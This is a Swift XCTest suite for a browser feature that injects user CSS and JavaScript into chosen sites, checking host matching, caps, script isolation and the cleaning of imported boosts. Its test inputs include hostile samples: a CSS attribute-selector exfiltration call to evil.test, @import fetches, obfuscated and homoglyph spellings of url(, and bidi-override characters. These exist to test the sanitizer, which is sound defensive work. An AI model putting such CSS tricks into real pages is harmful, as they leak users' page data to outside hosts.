import WebKit
import XCTest
@testable import Search

/// Boosts: which sites, what is kept, what comes in, and where scripts run.
@MainActor
final class BoostTests: XCTestCase {
    private func store() -> (Boosts, URL) {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("boosts-\(UUID().uuidString).json")
        return (Boosts(file: url), url)
    }

    func testMatchesHostAndSubdomainsOnLabelBoundary() {
        var b = Boost(name: "x", hosts: ["Example.com."])
        XCTAssertTrue(b.matches("example.com"))
        XCTAssertTrue(b.matches("WWW.Example.COM."))
        XCTAssertTrue(b.matches("a.b.example.com"))
        XCTAssertFalse(b.matches("evilexample.com"))
        XCTAssertFalse(b.matches("example.com.evil.org"))
        XCTAssertFalse(b.matches("example.co"))
        XCTAssertFalse(b.matches(nil))
        b.subdomains = false
        XCTAssertTrue(b.matches("example.com"))
        XCTAssertFalse(b.matches("a.example.com"))
    }

    func testStoreRoundTripAndOldFileTolerance() throws {
        let (boosts, url) = store()
        var b = Boost(name: "Mine", hosts: ["example.com"])
        b.css = "body{color:red}"
        b.js = "1"
        XCTAssertTrue(boosts.save(b))
        Disk.drain()
        let again = Boosts(file: url)
        XCTAssertEqual(again.all.count, 1)
        XCTAssertEqual(again.all.first?.js, "1")
        XCTAssertEqual(again.all.first?.css, b.css)

        // Old or hand-written: a bare array with only some keys.
        try Data(#"[{"name":"Old","hosts":["a.com"],"future":1},{"hosts":[]}]"#.utf8).write(to: url)
        let old = Boosts(file: url)
        XCTAssertEqual(old.all.map(\.name), ["Old"])
        XCTAssertTrue(old.all[0].enabled)
        try Data("garbage".utf8).write(to: url)
        XCTAssertTrue(Boosts(file: url).all.isEmpty)
    }

    func testImportStripsScriptUntilAllowedAndStartsOff() throws {
        let (source, _) = store()
        var b = Boost(name: "S", hosts: ["example.com"])
        b.js = "alert(1)"
        b.css = "a{}"
        source.save(b)
        let data = try XCTUnwrap(source.exportData())
        XCTAssertTrue(String(decoding: data, as: UTF8.self).contains("alert(1)"), "export carries scripts")

        let found = Boosts.parseImport(data)
        XCTAssertEqual(found.count, 1)
        XCTAssertNil(found[0].boost.js)
        XCTAssertEqual(found[0].script, "alert(1)")
        XCTAssertFalse(found[0].boost.enabled)
        XCTAssertTrue(found[0].boost.imported)

        let (target, _) = store()
        let none = target.commitImport(found, allowing: [])
        XCTAssertNil(none[0].js)
        XCTAssertNil(target.all[0].js)
        XCTAssertEqual(target.injections(host: "example.com", shy: false).count, 0, "off until kept")

        let (other, _) = store()
        other.commitImport(found, allowing: [found[0].id])
        XCTAssertEqual(other.all[0].js, "alert(1)")
        XCTAssertFalse(other.all[0].enabled)
    }

    func testCaps() throws {
        let (boosts, _) = store()
        var b = Boost(name: "Big", hosts: ["example.com"])
        b.css = String(repeating: "a", count: Boosts.maxCSS + 1)
        XCTAssertFalse(boosts.save(b))
        let big = try JSONEncoder().encode([b])
        XCTAssertTrue(Boosts.parseImport(big).isEmpty)
        b.css = ""
        b.js = String(repeating: "a", count: Boosts.maxJS + 1)
        XCTAssertFalse(boosts.save(b))
        b.js = nil
        b.hosts = (0...Boosts.maxHosts).map { "h\($0).com" }
        XCTAssertFalse(boosts.save(b))
        b.hosts = ["*.com"]
        XCTAssertFalse(boosts.save(b))
        b.hosts = ["ok.com"]
        XCTAssertTrue(boosts.save(b))
    }

    func testPrivateTabsGetNothingUnlessAllowed() {
        let (boosts, _) = store()
        var b = Boost(name: "S", hosts: ["example.com"])
        b.css = "a{}"
        b.js = "1"
        boosts.save(b)
        XCTAssertEqual(boosts.injections(host: "example.com", shy: true, allowsPrivate: false).count, 0)
        XCTAssertEqual(boosts.injections(host: "example.com", shy: true, allowsPrivate: true).count, 2)
        XCTAssertEqual(boosts.injections(host: "example.com", shy: false).count, 2)
        XCTAssertEqual(boosts.injections(host: "other.com", shy: false).count, 0)
    }

    func testScriptWorldIsNeitherSearchsNorThePages() {
        let (boosts, _) = store()
        var b = Boost(name: "S", hosts: ["example.com"])
        b.css = "a{}"
        b.js = "1"
        boosts.save(b)
        let list = boosts.injections(host: "example.com", shy: false)
        let script = list.first { $0.isScript }
        XCTAssertNotNil(script)
        XCTAssertTrue(script?.world !== Web.world)
        XCTAssertTrue(script?.world !== WKContentWorld.page)
        XCTAssertTrue(list.first { !$0.isScript }?.world === Web.world)
    }

    private func imported(_ edit: (inout Boost) -> Void) -> [BoostCandidate] {
        var b = Boost(name: "I", hosts: ["example.com"])
        edit(&b)
        return Boosts.parseImport((try? JSONEncoder().encode([b])) ?? Data())
    }

    func testImportedCSSLosesFetchesButKeepsDataURLs() {
        let css = #"@import url(https://evil.test/a.css); a[href^="x"]{background:url(https://evil.test/?v=x)} b{background:URL( 'http://e/' )} c{background:image-set("https://e/a.png" 1x)} d{background:url(data:image/png;base64,AAA)} e{background:u\72l(https://e/)}"#
        let c = imported { $0.css = css }
        XCTAssertEqual(c.count, 1)
        let out = c[0].boost.css
        XCTAssertFalse(out.contains("evil.test"))
        XCTAssertFalse(out.contains("a.png"))
        XCTAssertFalse(out.contains("http://e/"))
        XCTAssertFalse(out.contains("\\"), "escapes could spell url(")
        XCTAssertFalse(out.lowercased().contains("@import"))
        XCTAssertTrue(out.contains("url(data:image/png;base64,AAA)"))
        // Local CSS keeps its urls.
        var local = Boost(name: "L", hosts: ["example.com"])
        local.css = "a{background:url(https://example.com/x.png)}"
        XCTAssertTrue(local.stylesheet.contains("https://example.com/x.png"))
        XCTAssertTrue(imported { $0.hide = ["a[x=y]", "b{background:url(http://e)}", "c url(http://e)"] }[0].boost.hide == ["a[x=y]"])
    }

    func testImportedCSSThatStillFetchesOrIsBrokenIsDropped() {
        for bad in ["a{background:url(https://evil.test/x", "a{background:url(data:image/png;base64,AA", "a{color:red", "a{content:\"x}", "a{color:red}}", "a[x=\"y\"{}", "a{b:(}", "/* open a{}"] {
            let c = imported { $0.css = bad }
            XCTAssertEqual(c.count, 1, bad)
            XCTAssertEqual(c[0].boost.css, "", bad)
            XCTAssertTrue(c[0].cssDropped, bad)
        }
        for sneaky in ["a{background:url(\u{301}https://x/)}", "a{background:u\u{200B}rl(https://x/)}", "a{background:ｕｒｌ(https://x/)}", "a{content:\"é\"}"] {
            let c = imported { $0.css = sneaky }
            XCTAssertTrue(c[0].cssDropped, sneaky)
            XCTAssertEqual(c[0].boost.css, "", sneaky)
            XCTAssertTrue(imported { $0.hide = [sneaky] }[0].boost.hide.isEmpty, sneaky)
        }
        var local = Boost(name: "L", hosts: ["example.com"])
        local.css = "a::after{content:\"é\"}"
        XCTAssertTrue(local.stylesheet.contains("é"), "local CSS is untouched")
        let ok = imported { $0.css = "a{background:url(data:image/png;base64,AA)} b[x=\"y\"]{color:red} /* ) */" }
        XCTAssertFalse(ok[0].cssDropped)
        XCTAssertFalse(ok[0].boost.css.isEmpty)
        XCTAssertFalse(Boost.fetchesOrBroken("a{background:url('data:image/png;base64,AA')}"))
        XCTAssertTrue(Boost.fetchesOrBroken("@IMPORT 'x';"))
        XCTAssertTrue(Boost.fetchesOrBroken("a{background:-webkit-image-set(x 1x)}"))
    }

    func testReviewEscapesEverythingButPrintableASCII() {
        for odd in ["\u{200B}", "\u{00A0}", "\u{2028}", "\u{115F}", "\u{1160}", "\u{3164}", "\u{FFA0}", "\u{FE0F}", "\u{E0041}", "é"] {
            let shown = Boosts.reviewText("a\(odd)b")
            XCTAssertEqual(shown.hidden, 1, odd)
            XCTAssertTrue(shown.text.hasPrefix("a\\u{") && shown.text.hasSuffix("}b"), odd)
        }
        XCTAssertEqual(Boosts.reviewText("let a = 1;\n\tb").hidden, 0)
    }

    func testHostValidation() {
        for bad in ["com", "co.uk", "github.io", "localhost", "foo", "a b.com", "*.example.com", "exa_mple.com", "例え.jp", "a..com", "-a.com", "x.localhost"] {
            XCTAssertFalse(Boost.validHost(bad, subdomains: false), bad)
        }
        for good in ["example.com", "Sub.Example.co.uk.", "me.github.io", "1.2.3.4"] {
            XCTAssertTrue(Boost.validHost(good, subdomains: false), good)
        }
        XCTAssertFalse(Boost.validHost("1.2.3.4", subdomains: true))
        let (boosts, _) = store()
        XCTAssertFalse(boosts.save(Boost(name: "x", hosts: ["com"])))
    }

    func testImportedSubdomainsOffUnlessTicked() {
        let c = imported { $0.subdomains = true }
        XCTAssertFalse(c[0].boost.subdomains)
        XCTAssertTrue(c[0].wantsSubdomains)
        let (a, _) = store()
        XCTAssertFalse(a.commitImport(c, allowing: [])[0].subdomains)
        let (b, _) = store()
        XCTAssertTrue(b.commitImport(c, allowing: [], subdomains: [c[0].id])[0].subdomains)
    }

    func testBidiRefusedAndControlsEscaped() {
        XCTAssertTrue(imported { $0.js = "a\u{202E}b" }.isEmpty)
        XCTAssertTrue(imported { $0.js = "a\u{2066}b" }.isEmpty)
        let shown = Boosts.reviewText("x\u{200B}y\u{7}\n\t")
        XCTAssertEqual(shown.text, "x\\u{200B}y\\u{7}\n\t")
        XCTAssertEqual(shown.hidden, 2)
    }

    func testFieldAndFileCaps() throws {
        XCTAssertTrue(imported { $0.name = String(repeating: "n", count: Boosts.maxName + 1) }.isEmpty)
        XCTAssertTrue(imported { $0.hide = [String(repeating: "a", count: Boosts.maxSelector + 1)] }.isEmpty)
        XCTAssertTrue(imported { $0.hide = (0...Boosts.maxHide).map { "a\($0)" } }.isEmpty)
        let huge = Data(repeating: 32, count: Boosts.maxImportFile + 1)
        XCTAssertTrue(Boosts.parseImport(huge).isEmpty)
    }

    func testScriptChecksHostnameAtRunTime() {
        let js = Boosts.wrap("run()", hosts: ["Example.com"], subdomains: false)
        XCTAssertTrue(js.contains("location.hostname"))
        XCTAssertTrue(js.contains("[\"example.com\"]"))
        XCTAssertTrue(js.contains("(false &&"))
        let (boosts, _) = store()
        var b = Boost(name: "S", hosts: ["example.com"])
        b.js = "run()"
        boosts.save(b)
        XCTAssertTrue(boosts.injections(host: "example.com", shy: false)[0].source.contains("location.hostname"))
    }

    func testTrialAppliesToOneTabOnly() {
        let (boosts, _) = store()
        var b = Boost(name: "S", hosts: ["example.com"])
        b.css = "a{}"
        b.enabled = false
        boosts.save(b)
        let tab = UUID()
        boosts.tryOn(b.id, tab: tab)
        XCTAssertEqual(boosts.injections(host: "example.com", tab: tab, shy: false).count, 1)
        XCTAssertEqual(boosts.injections(host: "example.com", tab: UUID(), shy: false).count, 0)
        boosts.keep(b.id)
        XCTAssertEqual(boosts.injections(host: "example.com", tab: UUID(), shy: false).count, 1)
    }
}
